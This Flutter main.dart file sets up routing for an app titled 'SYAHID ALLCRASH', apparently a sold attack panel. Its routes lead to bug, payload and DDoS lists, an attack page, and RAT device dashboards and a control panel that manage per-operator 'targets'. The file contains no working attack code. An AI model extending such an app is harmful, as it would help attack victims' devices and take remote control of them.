import 'package:flutter/material.dart';
import 'package:shared_preferences/shared_preferences.dart'; 

// Import Halaman Utama
import 'landing_page.dart'; 
import 'login_page.dart';
import 'loader_page.dart';
import 'home_page.dart';
import 'seller_page.dart';
import 'admin_page.dart';
import 'buy_account.dart';
import 'splash.dart'; 
import 'device_dashboard.dart';
import 'control_panel.dart';

void main() {
  WidgetsFlutterBinding.ensureInitialized();
  
  // MODIFIKASI: Mengembalikan rute awal ke '/' (Landing Page)
  String initialRoute = '/'; 

  runApp(MyApp(startRoute: initialRoute));
}

class MyApp extends StatelessWidget {
  final String startRoute;
  const MyApp({super.key, required this.startRoute});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      title: 'SYAHID ALLCRASH',
      theme: ThemeData(
        brightness: Brightness.dark,
        fontFamily: 'ShareTechMono', 
        scaffoldBackgroundColor: Colors.black,
        colorScheme: const ColorScheme.dark().copyWith(
          primary: Colors.redAccent,
          secondary: Colors.purple,
        ),
        appBarTheme: const AppBarTheme(
          backgroundColor: Colors.black,
          elevation: 0,
          centerTitle: true,
        ),
      ),
      initialRoute: startRoute, 
      
      onGenerateRoute: (settings) {
        // Mengambil argumen dari Navigator.pushNamed
        final args = settings.arguments as Map<String, dynamic>?;

        switch (settings.name) {
          case '/':
            return MaterialPageRoute(builder: (_) => const LandingPage());

          case '/login':
            return MaterialPageRoute(builder: (_) => const LoginPage());

          case '/splash':
            return MaterialPageRoute(
              builder: (_) => SplashPage(data: args ?? {}),
            );

          case '/buy_account':
            return MaterialPageRoute(builder: (_) => const BuyAccountPage());

          case '/loader':
            return MaterialPageRoute(
              builder: (_) => DashboardPage(
                username: args?['username'] ?? '',
                password: args?['password'] ?? '',
                role: args?['role'] ?? 'member',
                sessionKey: args?['key'] ?? '',
                expiredDate: args?['expiredDate'] ?? '',
                listBug: List<Map<String, dynamic>>.from(args?['listBug'] ?? []),
                listPayload: List<Map<String, dynamic>>.from(args?['listPayload'] ?? []),
                listDDoS: List<Map<String, dynamic>>.from(args?['listDDoS'] ?? []),
                news: List<Map<String, dynamic>>.from(args?['news'] ?? []),
              ),
            );

          case '/attack':
            return MaterialPageRoute(
              builder: (_) => AttackPage(
                username: args?['username'] ?? '',
                password: args?['password'] ?? '',
                listBug: List<Map<String, dynamic>>.from(args?['listBug'] ?? []),
                role: args?['role'] ?? '',
                expiredDate: args?['expiredDate'] ?? '',
                sessionKey: args?['sessionKey'] ?? '',
              ),
            );

          case '/seller':
            return MaterialPageRoute(
              builder: (_) => SellerPage(keyToken: args?['keyToken'] ?? ''),
            );

          case '/admin':
            return MaterialPageRoute(
              builder: (_) => AdminPage(sessionKey: args?['sessionKey'] ?? ''),
            );

          case '/login_rat':
            // SINKRONISASI: Meneruskan username agar dashboard bisa memfilter target per-admin
            return MaterialPageRoute(
              builder: (_) => DeviceDashboardPage(username: args?['username'] ?? 'guest', sessionKey: args?['sessionKey'] ?? args?['key'] ?? ''),
            );

          case '/dashboard_rat':
            // SINKRONISASI: Memastikan ID terdeteksi dengan mem-passing username operator
            return MaterialPageRoute(
              builder: (_) => DeviceDashboardPage(username: args?['username'] ?? 'guest', sessionKey: args?['sessionKey'] ?? args?['key'] ?? ''),
            );

          case '/control_panel':
            // SUNTIKAN VVIP: Meneruskan parameter 'settings' sangat krusial agar Map {device, operator} 
            // terbaca di ControlCenterPage dan ID tidak menjadi 'unknown'
            return MaterialPageRoute(
              settings: settings,
              builder: (_) => const ControlCenterPage(),
            );

          default:
            return MaterialPageRoute(
              builder: (_) => const Scaffold(
                body: Center(child: Text("404 - PANEL NOT FOUND", style: TextStyle(color: Colors.red))),
              ),
            );
        }
      },
    );
  }
}